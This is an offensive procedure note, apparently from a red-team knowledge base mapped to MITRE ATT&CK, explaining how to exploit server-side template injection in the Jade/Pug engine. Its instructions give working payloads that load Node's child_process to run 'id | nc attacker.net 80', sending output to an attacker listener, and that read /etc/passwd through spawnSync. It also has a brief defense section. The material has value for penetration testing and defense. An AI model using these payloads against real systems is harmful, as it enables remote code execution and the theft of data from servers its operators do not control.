---
type: procedure
tactics:
  - '[[tactics/Execution|TA0002 - Execution]]'
techniques:
  - '[[techniques/Template-Injection|T1221 - Template Injection]]'
sub_techniques: []
tags:
  - ssti
  - jade
  - codepen
  - rce
  - template-injection
commands:
  - '[[commands/jade-ssti-exec-arbitrary-command-via-netcat]]'
  - '[[commands/jade-ssti-list-system-users-sync]]'
platforms:
  - web
  - linux
tools: []
verified: true
validated: true
---

# server-side-template-injection-jade-exec-command-and-list-users

## Summary

This procedure demonstrates how to exploit a Server-Side Template Injection (SSTI) vulnerability in a web application using the Jade (now Pug) template engine to execute arbitrary shell commands on the server and exfiltrate output via netcat, as well as synchronously list system users by reading /etc/passwd. It targets Node.js-based applications where user input is rendered without proper sanitization, allowing code injection that leads to remote code execution (RCE).

## Description

Server-Side Template Injection occurs when user-supplied input is interpolated into a template engine like Jade without escaping, enabling attackers to inject malicious template code that executes on the server during rendering. In Jade, this can chain to require Node.js modules like 'child_process' to run shell commands. The procedure covers two main actions: (1) executing a command (e.g., 'id') and piping its output to a netcat listener for exfiltration, useful for gaining shell-like access or data theft; (2) synchronously executing 'cat /etc/passwd' to enumerate users directly in the HTTP response. This is applicable in web pentesting or red teaming against vulnerable Node.js apps, assuming the injection point (e.g., a search field or profile name) is identified via fuzzing with payloads like '{{7*7}}' to confirm SSTI. Success grants RCE on the server, potentially leading to privilege escalation or lateral movement.

## Requirements

1. Valid access to the vulnerable web application endpoint where user input is rendered via Jade templates (e.g., via browser or proxy like Burp Suite).
2. Knowledge of the injection point (e.g., a form field or URL parameter that accepts template input).
3. For command exfiltration: A netcat listener running on the attacker's machine (e.g., nc -lvnp 80).
4. Target server running Node.js with Jade engine, typically on Linux (for /etc/passwd).
5. No authentication bypass needed if the injection point is public-facing.

## Defense

- Implement strict input validation and sanitization for all user inputs before template rendering, using safe rendering modes in Jade/Pug (e.g., escape untrusted content).
- Use a Web Application Firewall (WAF) to detect and block common SSTI payloads, such as references to 'child_process' or 'require'.
- Run web applications in isolated environments (e.g., containers) with least privilege, disabling unnecessary Node.js modules and monitoring for anomalous process spawns.
- Enable application logging for template rendering errors and review for injection attempts; use runtime application self-protection (RASP) tools.

## Objectives

1. Inject malicious Jade template code to execute arbitrary shell commands on the target server.
2. Exfiltrate command output to an attacker-controlled listener for interactive access or data collection.
3. Enumerate system users via direct response injection to map the environment for further attacks.
4. Achieve remote code execution (RCE) without direct shell access, confirming control over the server.

## Instructions

### Step 1: Confirm SSTI Vulnerability and Prepare Exfiltration

**Context**: Before injecting payloads, verify the SSTI by submitting a test like '- var x = 7*7' and checking if the response shows '49' (math expression evaluation). Set up a netcat listener on your machine to receive exfiltrated output. This step ensures the injection point works and prepares for command execution.

**Command** ([[commands/jade-ssti-exec-arbitrary-command-via-netcat]]):
```jade
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

> This payload chains Jade syntax to access the Node.js process object, require the 'child_process' module, and execute a shell command ('id' as example) whose output is piped to netcat for exfiltration to the attacker's listener. Customize 'id' to any command (e.g., 'whoami', 'ls /'), 'attacker.net' to your IP, and '80' to your listening port. Submit this multiline payload into the vulnerable input field (e.g., via POST request or URL param). The '=' prefix outputs the exec result, but since it's piped, the response may be empty while output goes to nc.

### Step 2: Execute Arbitrary Command and Exfiltrate Output

**Context**: Inject the payload to run the desired command. This accomplishes RCE by executing server-side shell code, with output sent remotely for analysis or further interaction (e.g., chain to download tools).

**Command** ([[commands/jade-ssti-exec-arbitrary-command-via-netcat]]):
```jade
- var x = root.process
- x = x.mainModule.require
- x = x('child_process')
= x.exec('id | nc attacker.net 80')
```

> On the attacker side, monitor the nc listener for output. If the command succeeds, you'll see the result (e.g., 'uid=33(www-data) gid=33(www-data) groups=33(www-data)' for 'id'). If no output, check firewall/port accessibility or try a different command/port. This verifies RCE and provides initial recon.

### Step 3: List System Users via Synchronous Execution

**Context**: Use a synchronous spawn to directly embed the output in the HTTP response, ideal for quick enumeration without needing a listener. This reveals user accounts for targeting weak credentials or privilege escalation paths.

**Command** ([[commands/jade-ssti-list-system-users-sync]]):
```jade
#{root.process.mainModule.require('child_process').spawnSync('cat', ['/etc/passwd']).stdout}
```

> Submit this payload to the injection point. The '#{}' syntax evaluates the expression and inserts the stdout directly into the rendered template. The response will include the full /etc/passwd content, listing users like 'root:x:0:0:root:/root:/bin/bash'. If the target is Windows, adapt to 'type C:\Windows\System32\config\SAM' or similar, but this assumes Linux.
